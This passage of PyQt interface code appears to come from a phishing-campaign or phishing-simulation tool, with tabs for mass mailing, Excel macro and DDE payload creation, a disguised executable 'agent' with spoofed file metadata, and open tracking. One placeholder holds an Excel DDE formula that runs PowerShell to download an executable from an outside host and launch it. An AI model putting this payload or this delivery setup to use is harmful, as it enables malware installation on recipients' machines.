        self.threadlabel = QtWidgets.QLabel(self.tab)
        self.threadlabel.setGeometry(QtCore.QRect(620, 110, 91, 16))
        self.threadlabel.setObjectName("threadlabel")

        self.subject = QtWidgets.QLineEdit(self.tab)
        self.subject.setGeometry(QtCore.QRect(170, 110, 201, 20))
        self.subject.setObjectName("subject")
        self.openattach.setFont(font)
        self.openattach.setObjectName("openattach")
        self.openattach.clicked.connect(self.attach)
        self.thread = QtWidgets.QSpinBox(self.tab)
        self.thread.setGeometry(QtCore.QRect(700, 110, 42, 22))
        self.thread.setObjectName("thread")
        self.thread.setValue(5)
        self.mailstart = QtWidgets.QPushButton(self.tab)
        self.mailstart.setGeometry(QtCore.QRect(820, 520, 101, 23))
        self.mailstart.setObjectName("mailstart")
        self.mailstart.clicked.connect(self.mailSender)

        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\sent-mail-128.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.tabWidget.addTab(self.tab, icon, "")
        self.tab_2 = QtWidgets.QWidget()
        self.tab_2.setObjectName("tab_2")
        self.label_6 = QtWidgets.QLabel(self.tab_2)
        self.label_6.setGeometry(QtCore.QRect(90, 60, 71, 16))
        self.label_6.setObjectName("label_6")
        self.label_7 = QtWidgets.QLabel(self.tab_2)
        self.label_7.setGeometry(QtCore.QRect(90, 140, 71, 16))
        self.label_7.setObjectName("label_7")
        self.makrofilename = QtWidgets.QLineEdit(self.tab_2)
        self.makrofilename.setGeometry(QtCore.QRect(170, 60, 113, 20))
        self.makrofilename.setObjectName("makrofilename")
        self.makrosavedir = QtWidgets.QLineEdit(self.tab_2)
        self.makrosavedir.setGeometry(QtCore.QRect(170, 140, 201, 20))
        self.makrosavedir.setObjectName("makrosavedir")
        self.makrosavedir.setReadOnly(True)
        self.macroselectdir = QtWidgets.QPushButton(self.tab_2)
        self.macroselectdir.setGeometry(QtCore.QRect(380, 140, 81, 23))
        font = QtGui.QFont()
        font.setPointSize(9)
        self.macroselectdir.setFont(font)
        self.macroselectdir.setObjectName("macroselectdir")
        self.macroselectdir.clicked.connect(self.macroSelectDir)
        self.label_8 = QtWidgets.QLabel(self.tab_2)
        self.label_8.setGeometry(QtCore.QRect(90, 100, 71, 21))
        self.label_8.setObjectName("label_8")
        self.makroagenturl = QtWidgets.QLineEdit(self.tab_2)
        self.makroagenturl.setGeometry(QtCore.QRect(170, 100, 201, 20))
        self.makroagenturl.setObjectName("makroagenturl")
        self.label_9 = QtWidgets.QLabel(self.tab_2)
        self.label_9.setGeometry(QtCore.QRect(90, 200, 91, 16))
        self.label_9.setObjectName("label_9")
        self.label_10 = QtWidgets.QLabel(self.tab_2)
        self.label_10.setGeometry(QtCore.QRect(550, 100, 91, 16))
        self.label_10.setObjectName("label_10")
        self.macrolinetext = QtWidgets.QTextEdit(self.tab_2)
        self.macrolinetext.setGeometry(QtCore.QRect(170, 210, 341, 221))
        self.macrolinetext.setObjectName("macrolinetext")
        self.macrobuttontext = QtWidgets.QLineEdit(self.tab_2)
        self.macrobuttontext.setGeometry(QtCore.QRect(670, 100, 101, 20))
        self.macrobuttontext.setStatusTip("")
        self.macrobuttontext.setInputMask("")
        self.macrobuttontext.setText("")
        self.macrobuttontext.setCursorPosition(0)
        self.macrobuttontext.setReadOnly(False)
        self.macrobuttontext.setPlaceholderText("")
        self.macrobuttontext.setCursorMoveStyle(QtCore.Qt.LogicalMoveStyle)
        self.macrobuttontext.setObjectName("macrobuttontext")
        self.label_11 = QtWidgets.QLabel(self.tab_2)
        self.label_11.setGeometry(QtCore.QRect(780, 100, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_11.setFont(font)
        self.label_11.setObjectName("label_11")
        self.label_12 = QtWidgets.QLabel(self.tab_2)
        self.label_12.setGeometry(QtCore.QRect(290, 60, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_12.setFont(font)
        self.label_12.setObjectName("label_12")
        self.label_15 = QtWidgets.QLabel(self.tab_2)
        self.label_15.setGeometry(QtCore.QRect(550, 60, 101, 16))
        self.label_15.setObjectName("label_15")
        self.macrotextloc = QtWidgets.QLineEdit(self.tab_2)
        self.macrotextloc.setGeometry(QtCore.QRect(670, 60, 41, 20))
        self.macrotextloc.setStatusTip("")
        self.macrotextloc.setInputMask("")
        self.macrotextloc.setText("")
        self.macrotextloc.setCursorPosition(0)
        self.macrotextloc.setReadOnly(False)
        self.macrotextloc.setPlaceholderText("")
        self.macrotextloc.setCursorMoveStyle(QtCore.Qt.LogicalMoveStyle)
        self.macrotextloc.setObjectName("macrotextloc")
        self.label_17 = QtWidgets.QLabel(self.tab_2)
        self.label_17.setGeometry(QtCore.QRect(550, 140, 121, 16))
        self.label_17.setObjectName("label_17")
        self.macrobuttonloc = QtWidgets.QLineEdit(self.tab_2)
        self.macrobuttonloc.setGeometry(QtCore.QRect(670, 140, 41, 20))
        self.macrobuttonloc.setStatusTip("")
        self.macrobuttonloc.setInputMask("")
        self.macrobuttonloc.setText("")
        self.macrobuttonloc.setCursorPosition(0)
        self.macrobuttonloc.setReadOnly(False)
        self.macrobuttonloc.setPlaceholderText("")
        self.macrobuttonloc.setCursorMoveStyle(QtCore.Qt.LogicalMoveStyle)
        self.macrobuttonloc.setObjectName("macrobuttonloc")
        self.label_19 = QtWidgets.QLabel(self.tab_2)
        self.label_19.setGeometry(QtCore.QRect(550, 180, 121, 16))
        self.label_19.setObjectName("label_19")
        self.macroimage = QtWidgets.QLineEdit(self.tab_2)
        self.macroimage.setGeometry(QtCore.QRect(670, 180, 191, 20))
        self.macroimage.setStatusTip("")
        self.macroimage.setInputMask("")
        self.macroimage.setText("")
        self.macroimage.setCursorPosition(0)
        self.macroimage.setReadOnly(True)
        self.macroimage.setPlaceholderText("")
        self.macroimage.setCursorMoveStyle(QtCore.Qt.LogicalMoveStyle)
        self.macroimage.setObjectName("macroimage")
        self.macroselectimage = QtWidgets.QPushButton(self.tab_2)
        self.macroselectimage.setGeometry(QtCore.QRect(870, 180, 81, 23))
        font = QtGui.QFont()
        font.setPointSize(9)
        self.macroselectimage.setFont(font)
        self.macroselectimage.setObjectName("macroselectimage")
        self.macroselectimage.clicked.connect(self.macroSelectImg)
        self.macroimageloc = QtWidgets.QLineEdit(self.tab_2)
        self.macroimageloc.setGeometry(QtCore.QRect(670, 220, 41, 20))
        self.macroimageloc.setStatusTip("")
        self.macroimageloc.setInputMask("")
        self.macroimageloc.setText("")
        self.macroimageloc.setCursorPosition(0)
        self.macroimageloc.setReadOnly(False)
        self.macroimageloc.setPlaceholderText("")
        self.macroimageloc.setCursorMoveStyle(QtCore.Qt.LogicalMoveStyle)
        self.macroimageloc.setObjectName("macroimageloc")
        self.label_21 = QtWidgets.QLabel(self.tab_2)
        self.label_21.setGeometry(QtCore.QRect(550, 220, 121, 16))
        self.label_21.setObjectName("label_21")
        self.label_18 = QtWidgets.QLabel(self.tab_2)
        self.label_18.setGeometry(QtCore.QRect(950, 55, 101, 21))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_18.setFont(font)
        self.label_18.setObjectName("label_18")
        self.label_16 = QtWidgets.QLabel(self.tab_2)
        self.label_16.setGeometry(QtCore.QRect(920, 50, 31, 31))
        self.label_16.setText("")
        self.label_16.setPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\info_512pxGREY.png"))
        self.label_16.setScaledContents(True)
        self.label_16.setObjectName("label_16")
        self.macrocreate = QtWidgets.QPushButton(self.tab_2)
        self.macrocreate.setGeometry(QtCore.QRect(280, 480, 121, 23))
        self.macrocreate.setObjectName("macrocreate")
        self.macrocreate.clicked.connect(self.createMac)
        self.groupBox_5 = QtWidgets.QGroupBox(self.tab_2)
        self.groupBox_5.setGeometry(QtCore.QRect(570, 250, 371, 301))
        self.groupBox_5.setObjectName("groupBox_5")
        self.label_13 = QtWidgets.QLabel(self.groupBox_5)
        self.label_13.setGeometry(QtCore.QRect(0, 30, 371, 271))
        self.label_13.setText("")
        self.label_13.setPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\Example.png"))
        self.label_13.setObjectName("label_13")
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\ExcelMacro.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.tabWidget.addTab(self.tab_2, icon1, "")
        self.tab_3 = QtWidgets.QWidget()
        self.tab_3.setObjectName("tab_3")
        self.connectSettings = QtWidgets.QGroupBox(self.tab_3)
        self.connectSettings.setGeometry(QtCore.QRect(70, 30, 451, 131))
        self.connectSettings.setObjectName("connectSettings")
        self.host = QtWidgets.QLineEdit(self.connectSettings)
        self.host.setGeometry(QtCore.QRect(60, 40, 121, 20))
        self.host.setObjectName("host")
        self.label_20 = QtWidgets.QLabel(self.connectSettings)
        self.label_20.setGeometry(QtCore.QRect(10, 40, 47, 13))
        self.label_20.setObjectName("label_20")
        self.label_22 = QtWidgets.QLabel(self.connectSettings)
        self.label_22.setGeometry(QtCore.QRect(10, 80, 47, 13))
        self.label_22.setObjectName("label_22")
        self.port = QtWidgets.QLineEdit(self.connectSettings)
        self.port.setGeometry(QtCore.QRect(60, 80, 41, 16))
        self.port.setObjectName("port")
        self.label_79 = QtWidgets.QLabel(self.connectSettings)
        self.label_79.setGeometry(QtCore.QRect(200, 40, 81, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_79.setFont(font)
        self.label_79.setObjectName("label_79")
        self.detailProperties = QtWidgets.QGroupBox(self.tab_3)
        self.detailProperties.setGeometry(QtCore.QRect(70, 200, 451, 341))
        self.detailProperties.setObjectName("detailProperties")
        self.label_23 = QtWidgets.QLabel(self.detailProperties)
        self.label_23.setGeometry(QtCore.QRect(20, 40, 121, 16))
        self.label_23.setObjectName("label_23")
        self.label_24 = QtWidgets.QLabel(self.detailProperties)
        self.label_24.setGeometry(QtCore.QRect(20, 70, 121, 16))
        self.label_24.setObjectName("label_24")
        self.label_25 = QtWidgets.QLabel(self.detailProperties)
        self.label_25.setGeometry(QtCore.QRect(20, 100, 111, 16))
        self.label_25.setObjectName("label_25")
        self.label_26 = QtWidgets.QLabel(self.detailProperties)
        self.label_26.setGeometry(QtCore.QRect(20, 130, 81, 16))
        self.label_26.setObjectName("label_26")
        self.label_27 = QtWidgets.QLabel(self.detailProperties)
        self.label_27.setGeometry(QtCore.QRect(20, 160, 131, 16))
        self.label_27.setObjectName("label_27")
        self.compname = QtWidgets.QLineEdit(self.detailProperties)
        self.compname.setGeometry(QtCore.QRect(160, 40, 121, 20))
        self.compname.setObjectName("compname")



        self.filedes = QtWidgets.QLineEdit(self.detailProperties)
        self.filedes.setGeometry(QtCore.QRect(160, 70, 121, 20))
        self.filedes.setObjectName("filedes")
        self.filevers = QtWidgets.QLineEdit(self.detailProperties)
        self.filevers.setGeometry(QtCore.QRect(160, 100, 121, 20))
        self.filevers.setObjectName("filevers")
        self.filecorp = QtWidgets.QLineEdit(self.detailProperties)
        self.filecorp.setGeometry(QtCore.QRect(160, 130, 121, 20))
        self.filecorp.setObjectName("filecorp")
        self.orginalname = QtWidgets.QLineEdit(self.detailProperties)
        self.orginalname.setGeometry(QtCore.QRect(160, 160, 121, 20))
        self.orginalname.setObjectName("orginalname")
        self.label_28 = QtWidgets.QLabel(self.detailProperties)
        self.label_28.setGeometry(QtCore.QRect(20, 190, 131, 16))
        self.label_28.setObjectName("label_28")
        self.productname = QtWidgets.QLineEdit(self.detailProperties)
        self.productname.setGeometry(QtCore.QRect(160, 190, 121, 20))
        self.productname.setObjectName("productname")
        self.label_29 = QtWidgets.QLabel(self.detailProperties)
        self.label_29.setGeometry(QtCore.QRect(20, 220, 131, 16))
        self.label_29.setObjectName("label_29")
        self.productver = QtWidgets.QLineEdit(self.detailProperties)
        self.productver.setGeometry(QtCore.QRect(160, 220, 121, 20))
        self.productver.setObjectName("productver")
        self.label_37 = QtWidgets.QLabel(self.detailProperties)
        self.label_37.setGeometry(QtCore.QRect(20, 250, 131, 16))
        self.label_37.setObjectName("label_37")
        self.fileverseye = QtWidgets.QLineEdit(self.detailProperties)
        self.fileverseye.setGeometry(QtCore.QRect(160, 250, 121, 20))
        self.fileverseye.setObjectName("fileverseye")
        self.fileico = QtWidgets.QLineEdit(self.detailProperties)
        self.fileico.setGeometry(QtCore.QRect(160, 310, 151, 20))
        self.fileico.setObjectName("fileico")
        self.label_68 = QtWidgets.QLabel(self.detailProperties)
        self.label_68.setGeometry(QtCore.QRect(20, 310, 131, 16))
        self.label_68.setObjectName("label_68")
        self.fileicoselect = QtWidgets.QPushButton(self.detailProperties)
        self.fileicoselect.setGeometry(QtCore.QRect(314, 310, 81, 23))
        self.fileicoselect.setObjectName("fileicoselect")
        self.fileicoselect.clicked.connect(self.AgentIco)
        self.label_71 = QtWidgets.QLabel(self.detailProperties)
        self.label_71.setGeometry(QtCore.QRect(290, 40, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_71.setFont(font)
        self.label_71.setObjectName("label_71")
        self.label_72 = QtWidgets.QLabel(self.detailProperties)
        self.label_72.setGeometry(QtCore.QRect(290, 70, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_72.setFont(font)
        self.label_72.setObjectName("label_72")
        self.label_73 = QtWidgets.QLabel(self.detailProperties)
        self.label_73.setGeometry(QtCore.QRect(290, 100, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_73.setFont(font)
        self.label_73.setObjectName("label_73")
        self.label_74 = QtWidgets.QLabel(self.detailProperties)
        self.label_74.setGeometry(QtCore.QRect(290, 130, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_74.setFont(font)
        self.label_74.setObjectName("label_74")
        self.label_75 = QtWidgets.QLabel(self.detailProperties)
        self.label_75.setGeometry(QtCore.QRect(290, 160, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_75.setFont(font)
        self.label_75.setObjectName("label_75")
        self.label_76 = QtWidgets.QLabel(self.detailProperties)
        self.label_76.setGeometry(QtCore.QRect(290, 190, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_76.setFont(font)
        self.label_76.setObjectName("label_76")
        self.label_77 = QtWidgets.QLabel(self.detailProperties)
        self.label_77.setGeometry(QtCore.QRect(290, 220, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_77.setFont(font)
        self.label_77.setObjectName("label_77")
        self.label_78 = QtWidgets.QLabel(self.detailProperties)
        self.label_78.setGeometry(QtCore.QRect(290, 250, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_78.setFont(font)
        self.label_78.setObjectName("label_78")
        self.label_80 = QtWidgets.QLabel(self.detailProperties)
        self.label_80.setGeometry(QtCore.QRect(290, 280, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_80.setFont(font)
        self.label_80.setObjectName("label_80")
        self.filename = QtWidgets.QLineEdit(self.detailProperties)
        self.filename.setGeometry(QtCore.QRect(160, 280, 121, 20))
        self.filename.setObjectName("filename")
        self.label_70 = QtWidgets.QLabel(self.detailProperties)
        self.label_70.setGeometry(QtCore.QRect(20, 280, 131, 16))
        self.label_70.setObjectName("label_70")
        self.groupBox_6 = QtWidgets.QGroupBox(self.tab_3)
        self.groupBox_6.setGeometry(QtCore.QRect(650, 30, 521, 511))
        self.groupBox_6.setObjectName("groupBox_6")
        self.label_14 = QtWidgets.QLabel(self.groupBox_6)
        self.label_14.setGeometry(QtCore.QRect(30, 20, 251, 71))
        self.label_14.setText("")
        self.label_14.setPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\exe.PNG"))
        self.label_14.setObjectName("label_14")
        self.label_69 = QtWidgets.QLabel(self.groupBox_6)
        self.label_69.setGeometry(QtCore.QRect(30, 90, 451, 531))
        self.label_69.setText("")
        self.label_69.setPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\exe2.PNG"))
        self.label_69.setObjectName("label_69")
        self.createagent = QtWidgets.QPushButton(self.tab_3)
        self.createagent.setGeometry(QtCore.QRect(220, 170, 101, 31))
        self.createagent.setObjectName("createagent")
        self.createagent.clicked.connect(self.AgentCreate)
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\agent.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.tabWidget.addTab(self.tab_3, icon2, "")
        self.tab_4 = QtWidgets.QWidget()
        self.tab_4.setMaximumSize(QtCore.QSize(16777215, 16777215))
        self.tab_4.setSizeIncrement(QtCore.QSize(0, 0))
        self.tab_4.setBaseSize(QtCore.QSize(0, 0))
        self.tab_4.setObjectName("tab_4")
        self.exceldde = QtWidgets.QGroupBox(self.tab_4)
        self.exceldde.setGeometry(QtCore.QRect(170, 40, 911, 401))
        self.exceldde.setObjectName("exceldde")
        self.label_81 = QtWidgets.QLabel(self.exceldde)
        self.label_81.setGeometry(QtCore.QRect(30, 50, 81, 21))
        self.label_81.setObjectName("label_81")
        self.agenturl = QtWidgets.QLineEdit(self.exceldde)
        self.agenturl.setGeometry(QtCore.QRect(140, 50, 161, 20))
        self.agenturl.setObjectName("agenturl")
        self.label_82 = QtWidgets.QLabel(self.exceldde)
        self.label_82.setGeometry(QtCore.QRect(30, 90, 101, 21))
        self.label_82.setObjectName("label_82")
        self.agentname = QtWidgets.QLineEdit(self.exceldde)
        self.agentname.setGeometry(QtCore.QRect(140, 90, 161, 20))
        self.agentname.setObjectName("agentname")
        self.label_83 = QtWidgets.QLabel(self.exceldde)
        self.label_83.setGeometry(QtCore.QRect(30, 130, 101, 21))
        self.label_83.setObjectName("label_83")
        self.ddelinetext = QtWidgets.QTextEdit(self.exceldde)
        self.ddelinetext.setGeometry(QtCore.QRect(140, 140, 271, 251))
        self.ddelinetext.setObjectName("ddelinetext")
        self.ddetextloc = QtWidgets.QLineEdit(self.exceldde)
        self.ddetextloc.setGeometry(QtCore.QRect(590, 50, 31, 20))
        self.ddetextloc.setObjectName("ddetextloc")
        self.label_84 = QtWidgets.QLabel(self.exceldde)
        self.label_84.setGeometry(QtCore.QRect(470, 50, 101, 21))
        self.label_84.setObjectName("label_84")
        self.label_85 = QtWidgets.QLabel(self.exceldde)
        self.label_85.setGeometry(QtCore.QRect(630, 50, 101, 16))
        font = QtGui.QFont()
        font.setPointSize(7)
        self.label_85.setFont(font)
        self.label_85.setObjectName("label_85")
        self.ddeimgloc = QtWidgets.QLineEdit(self.exceldde)
        self.ddeimgloc.setGeometry(QtCore.QRect(590, 130, 41, 20))
        self.ddeimgloc.setStatusTip("")
        self.ddeimgloc.setInputMask("")
        self.ddeimgloc.setText("")
        self.ddeimgloc.setCursorPosition(0)
        self.ddeimgloc.setReadOnly(False)
        self.ddeimgloc.setPlaceholderText("")
        self.ddeimgloc.setCursorMoveStyle(QtCore.Qt.LogicalMoveStyle)
        self.ddeimgloc.setObjectName("ddeimgloc")
        self.label_86 = QtWidgets.QLabel(self.exceldde)
        self.label_86.setGeometry(QtCore.QRect(470, 90, 121, 16))
        self.label_86.setObjectName("label_86")
        self.label_87 = QtWidgets.QLabel(self.exceldde)
        self.label_87.setGeometry(QtCore.QRect(470, 130, 121, 16))
        self.label_87.setObjectName("label_87")
        self.ddeimageselect = QtWidgets.QPushButton(self.exceldde)
        self.ddeimageselect.setGeometry(QtCore.QRect(790, 90, 81, 23))
        font = QtGui.QFont()
        font.setPointSize(9)
        self.ddeimageselect.setFont(font)
        self.ddeimageselect.setObjectName("ddeimageselect")
        self.ddeimageselect.clicked.connect(self.DDEImgSelect)
        self.ddeimage = QtWidgets.QLineEdit(self.exceldde)
        self.ddeimage.setGeometry(QtCore.QRect(590, 90, 191, 20))
        self.ddeimage.setStatusTip("")
        self.ddeimage.setInputMask("")
        self.ddeimage.setText("")
        self.ddeimage.setCursorPosition(0)
        self.ddeimage.setReadOnly(True)
        self.ddeimage.setPlaceholderText("")
        self.ddeimage.setCursorMoveStyle(QtCore.Qt.LogicalMoveStyle)
        self.ddeimage.setObjectName("ddeimage")

        self.orthercheck = QtWidgets.QCheckBox(self.exceldde)
        self.orthercheck.setGeometry(QtCore.QRect(470, 180, 101, 17))
        font = QtGui.QFont()
        font.setPointSize(8)
        self.orthercheck.setFont(font)
        self.orthercheck.setObjectName("orthercheck")


        self.ortherpayload = QtWidgets.QTextEdit(self.exceldde)
        self.ortherpayload.setGeometry(QtCore.QRect(570, 180, 301, 151))
        self.ortherpayload.setObjectName("ortherpayload")
        self.ortherpayload.setReadOnly(False)
        self.ortherpayload.setPlaceholderText("=cmd|'/c powershell.exe (New-Object System.Net.WebClient).DownloadFile(\"https://the.earth.li/~sgtatham/putty/latest/w32/psftp.exe\",\"agent.exe\");Start-Process \"agent.exe\"'")
        icon3 = QtGui.QIcon()
        icon3.addPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\Office-icon.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.tabWidget.addTab(self.tab_4, icon3, "")
        self.tab_6 = QtWidgets.QWidget()
        self.tab_6.setObjectName("tab_6")
        self.mailOpenTrack = QtWidgets.QGroupBox(self.tab_6)
        self.mailOpenTrack.setGeometry(QtCore.QRect(100, 30, 421, 421))
        self.mailOpenTrack.setObjectName("mailOpenTrack")
        self.mailopenwidget = QtWidgets.QTreeWidget(self.mailOpenTrack)
        self.mailopenwidget.setGeometry(QtCore.QRect(10, 50, 401, 361))
        self.mailopenwidget.setObjectName("mailopenwidget")

        self.ddestart = QtWidgets.QPushButton(self.exceldde)
        self.ddestart.setGeometry(QtCore.QRect(680, 350, 81, 23))
        self.ddestart.setFont(font)
        self.ddestart.setObjectName("ddestart")
        self.ddestart.clicked.connect(self.DDECreate)

        self.screetwidget = QtWidgets.QTreeWidget()
        self.nonscreetwidget = QtWidgets.QTreeWidget()

        self.agentOpenTrack = QtWidgets.QGroupBox(self.tab_6)
        self.agentOpenTrack.setGeometry(QtCore.QRect(550, 30, 601, 421))
        self.agentOpenTrack.setObjectName("agentOpenTrack")
        self.agentOpenwidget = QtWidgets.QTreeWidget(self.agentOpenTrack)
        self.agentOpenwidget.setGeometry(QtCore.QRect(5, 51, 591, 361))
        self.agentOpenwidget.setAutoScroll(True)
        self.agentOpenwidget.setDragEnabled(False)
        self.agentOpenwidget.setAlternatingRowColors(False)
        self.agentOpenwidget.setAnimated(True)
        self.agentOpenwidget.setObjectName("agentOpenwidget")
        self.returnstart = QtWidgets.QPushButton(self.tab_6)
        self.returnstart.setGeometry(QtCore.QRect(800, 510, 100, 23))
        self.returnstart.setObjectName("returnstart")
        self.returnstart.clicked.connect(self.StartRet)


        self.opentrackstart = QtWidgets.QPushButton(self.tab_6)
        self.opentrackstart.setGeometry(QtCore.QRect(250,470,121,23))
        self.opentrackstart.setObjectName("opentrackstart")
        self.opentrackstart.clicked.connect(self.returnControl)

        self.returnhost = QtWidgets.QLineEdit(self.tab_6)
        self.returnhost.setGeometry(QtCore.QRect(720, 470, 113, 20))
        self.returnhost.setObjectName("returnhost")

        self.returnport = QtWidgets.QLineEdit(self.tab_6)
        self.returnport.setGeometry(QtCore.QRect(870, 470, 113, 20))
        self.returnport.setObjectName("returnport")

        self.returnhostlabel = QtWidgets.QLabel(self.tab_6)
        self.returnhostlabel.setGeometry(QtCore.QRect(760, 450, 47, 14))
        self.returnhostlabel.setObjectName("returnhostlabel")

        self.returnportlabel = QtWidgets.QLabel(self.tab_6)
        self.returnportlabel.setGeometry(QtCore.QRect(910, 450, 47, 14))
        self.returnportlabel.setObjectName("returnportlabel")


        icon4 = QtGui.QIcon()
        icon4.addPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\search_mail-512.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.tabWidget.addTab(self.tab_6, icon4, "")
        self.tab_5 = QtWidgets.QWidget()
        self.tab_5.setObjectName("tab_5")
        self.mailopenstatistic = QtWidgets.QGraphicsView(self.tab_5)
        self.mailopenstatistic.setGeometry(QtCore.QRect(0, 30, 611, 480))
        self.mailopenstatistic.setObjectName("mailopenstatistic")
        self.agentopenstatistic = QtWidgets.QGraphicsView(self.tab_5)
        self.agentopenstatistic.setGeometry(QtCore.QRect(640, 30, 615, 480))
        self.agentopenstatistic.setObjectName("agentopenstatistic")
        self.statisticgenerate = QtWidgets.QPushButton(self.tab_5)
        self.statisticgenerate.setGeometry(QtCore.QRect(900, 520, 121, 23))
        self.statisticgenerate.setObjectName("statisticgenerate")
        self.statisticgenerate.clicked.connect(self.GenerateStatistic)

        self.statisticmailgenerate = QtWidgets.QPushButton(self.tab_5)
        self.statisticmailgenerate.setGeometry(QtCore.QRect(240, 520, 121, 23))
        self.statisticmailgenerate.setObjectName("statisticmailgenerate")
        self.statisticmailgenerate.clicked.connect(self.GenerateMailStatistic)



        self.label_34 = QtWidgets.QLabel(self.tab_5)
        self.label_34.setGeometry(QtCore.QRect(230, 0, 121, 20))
        self.label_34.setObjectName("label_34")
        self.label_35 = QtWidgets.QLabel(self.tab_5)
        self.label_35.setGeometry(QtCore.QRect(860, 0, 141, 20))
        self.label_35.setObjectName("label_35")

        icon5 = QtGui.QIcon()
        icon5.addPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\grey_new_seo2-40-128.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.tabWidget.addTab(self.tab_5, icon5, "")
        self.tab_7 = QtWidgets.QWidget()
        self.tab_7.setObjectName("tab_7")
        self.smtpSetting = QtWidgets.QGroupBox(self.tab_7)
        self.smtpSetting.setGeometry(QtCore.QRect(160, 40, 431, 421))
        self.smtpSetting.setObjectName("smtpSetting")
        self.label_30 = QtWidgets.QLabel(self.smtpSetting)
        self.label_30.setGeometry(QtCore.QRect(40, 70, 91, 16))
        self.label_30.setObjectName("label_30")
        self.smtphost = QtWidgets.QLineEdit(self.smtpSetting)
        self.smtphost.setGeometry(QtCore.QRect(150, 70, 151, 20))
        self.smtphost.setObjectName("smtphost")
        self.label_31 = QtWidgets.QLabel(self.smtpSetting)
        self.label_31.setGeometry(QtCore.QRect(40, 110, 91, 16))
        self.label_31.setObjectName("label_31")
        self.smtpport = QtWidgets.QLineEdit(self.smtpSetting)
        self.smtpport.setGeometry(QtCore.QRect(150, 110, 41, 20))
        self.smtpport.setObjectName("smtpport")
        self.label_32 = QtWidgets.QLabel(self.smtpSetting)
        self.label_32.setGeometry(QtCore.QRect(40, 150, 91, 16))
        self.label_32.setObjectName("label_32")
        self.mailadress = QtWidgets.QLineEdit(self.smtpSetting)
        self.mailadress.setGeometry(QtCore.QRect(150, 150, 151, 20))
        self.mailadress.setObjectName("mailadress")
        self.label_33 = QtWidgets.QLabel(self.smtpSetting)
        self.label_33.setGeometry(QtCore.QRect(40, 190, 101, 16))
        self.label_33.setObjectName("label_33")
        self.mailpassword = QtWidgets.QLineEdit(self.smtpSetting)
        self.mailpassword.setGeometry(QtCore.QRect(150, 190, 151, 20))
        self.mailpassword.setObjectName("mailpassword")
        self.mailpassword.setEchoMode(QLineEdit.Password)
        self.serverSetting = QtWidgets.QGroupBox(self.tab_7)
        self.serverSetting.setGeometry(QtCore.QRect(650, 40, 431, 421))
        self.serverSetting.setObjectName("serverSetting")
        self.sship = QtWidgets.QLineEdit(self.serverSetting)
        self.sship.setGeometry(QtCore.QRect(170, 80, 151, 20))
        self.sship.setObjectName("sship")
        self.sshport = QtWidgets.QLineEdit(self.serverSetting)
        self.sshport.setGeometry(QtCore.QRect(170, 120, 41, 20))
        self.sshport.setObjectName("sshport")
        self.label_109 = QtWidgets.QLabel(self.serverSetting)
        self.label_109.setGeometry(QtCore.QRect(30, 270, 121, 16))
        self.label_109.setObjectName("label_109")
        self.label_110 = QtWidgets.QLabel(self.serverSetting)
        self.label_110.setGeometry(QtCore.QRect(30, 120, 91, 16))
        self.label_110.setObjectName("label_110")
        self.sshpass = QtWidgets.QLineEdit(self.serverSetting)
        self.sshpass.setGeometry(QtCore.QRect(170, 270, 151, 20))
        self.sshpass.setObjectName("sshpass")
        self.sshpass.setEchoMode(QLineEdit.Password)
        self.sshpass.setEnabled(False)


        self.label_111 = QtWidgets.QLabel(self.serverSetting)
        self.label_111.setGeometry(QtCore.QRect(30, 80, 111, 16))
        self.label_111.setObjectName("label_111")
        self.accesslog = QtWidgets.QLineEdit(self.serverSetting)
        self.accesslog.setGeometry(QtCore.QRect(170, 160, 151, 20))
        self.accesslog.setObjectName("accesslog")
        self.label_112 = QtWidgets.QLabel(self.serverSetting)
        self.label_112.setGeometry(QtCore.QRect(30, 160, 121, 16))
        self.label_112.setObjectName("label_112")
        self.sshuser = QtWidgets.QLineEdit(self.serverSetting)
        self.sshuser.setGeometry(QtCore.QRect(170, 40, 151, 20))
        self.sshuser.setObjectName("sshuser")
        self.label_113 = QtWidgets.QLabel(self.serverSetting)
        self.label_113.setGeometry(QtCore.QRect(30, 40, 121, 16))
        self.label_113.setObjectName("label_113")
        self.label_114 = QtWidgets.QLabel(self.serverSetting)
        self.label_114.setGeometry(QtCore.QRect(30, 200, 121, 16))
        self.label_114.setObjectName("label_114")

        self.privatelabel = QtWidgets.QLabel(self.serverSetting)
        self.privatelabel.setGeometry(QtCore.QRect(30, 340, 121, 16))
        self.privatelabel.setObjectName("privatelabel")


        self.privatepasslabel = QtWidgets.QLabel(self.serverSetting)
        self.privatepasslabel.setGeometry(QtCore.QRect(30, 380, 121, 16))
        self.privatepasslabel.setObjectName("privatepasslabel")



        self.opentrackurl = QtWidgets.QLineEdit(self.serverSetting)
        self.opentrackurl.setGeometry(QtCore.QRect(170, 200, 151, 20))
        self.opentrackurl.setObjectName("opentrackurl")

